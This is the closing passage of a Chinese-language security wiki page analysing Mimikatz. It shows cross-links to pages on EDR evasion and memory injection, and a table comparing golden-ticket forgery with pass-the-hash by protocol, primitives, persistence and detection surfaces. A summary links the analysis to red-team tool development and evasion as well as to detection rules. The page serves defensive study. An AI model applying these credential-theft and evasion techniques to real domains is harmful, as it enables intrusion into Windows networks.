- `[[lm-ntlm-hash-generation-analysis]]` — LM/NTLM Hash 生成算法与 OpenSSL 适配，直接关联 `/krbtgt` 与 `/ntlm` 参数值的来源
- `[[windows-syscall-internals-sysenter-kifastcallentry]]` — Windows 系统调用机制，理解 LSASS 交互与票据注入底层
- `[[phantom-dll-hollowing-technique]]` — 内存注入与模块伪装技术，可结合 `/ptt` 免杀思路研究
- `[[pe-export-table-internals]]` — PE 导出表解析，辅助理解 `CDLocateCSystem` 等内部函数定位方式
- `[[mfc-message-map-internals-reverse-engineering]]` — MFC 消息映射逆向模式，对比 Mimikatz 自建分发机制的异同
- `[[argument-spoofing-edr-evasion]]` — 参数欺骗对抗 EDR 进程监控，可结合 `CreateProcessWithLogonW` 启动参数混淆
- `[[memory-scanning-tools-evasion-techniques]]` — 内存扫描工具检测原理与 UDRL 规避实现，关联 LSASS 内存补丁的检测对抗

---

## 八、总结

Mimikatz 通过 **KUHL_M 模块注册表 + 双层线性查找** 实现了轻量级、可扩展的命令分发架构。两大核心攻击模块展示了 Windows 认证体系的两面：

| 维度 | `kerberos::golden` (黄金票据) | `sekurlsa::pth` (Pass-the-Hash) |
|------|-------------------------------|----------------------------------|
| **协议层** | Kerberos (Ticket-based) | NTLM (Challenge/Response) |
| **攻击面** | 伪造 KDC 签名的 TGT | 篡改 LSASS 运行时凭据缓存 |
| **核心原语** | PAC 构造 + BER 编码 + krbtgt 密钥加密 | 内存签名定位 + LSA Protect 解密 + 凭据块重加密 |
| **持久性** | 票据文件可跨重启复用 | 仅运行时内存生效，重启失效 |
| **检测面** | 异常 ETYPE、时间窗口、PAC 校验和 | LSASS 内存完整性、异常 `WriteProcessMemory`、凭据字段不一致 |
| **工具生态** | Rubeus, Kekeo, Impacket | Impacket (协议层), Cobalt Strike (pth) |

理解上述流程不仅有助于红队工具二次开发与免杀，更为 **Kerberos/NTLM 协议安全审计、黄金票据/PTH 检测规则编写**（如基于 PAC 校验和异常、ETYPE 降级、异常时间窗口、LSASS 内存完整性监控、凭据字段完整性校验等）提供了坚实的代码级依据。

> **安全提示**：本页面仅供安全研究与防御分析使用，请勿用于未授权渗透测试或非法用途。实战中请遵守当地法律法规与授权范围。

## 来源

- [0x4d5a-202103-202209_14](../sources/0x4d5a-202103-202209_14.md)
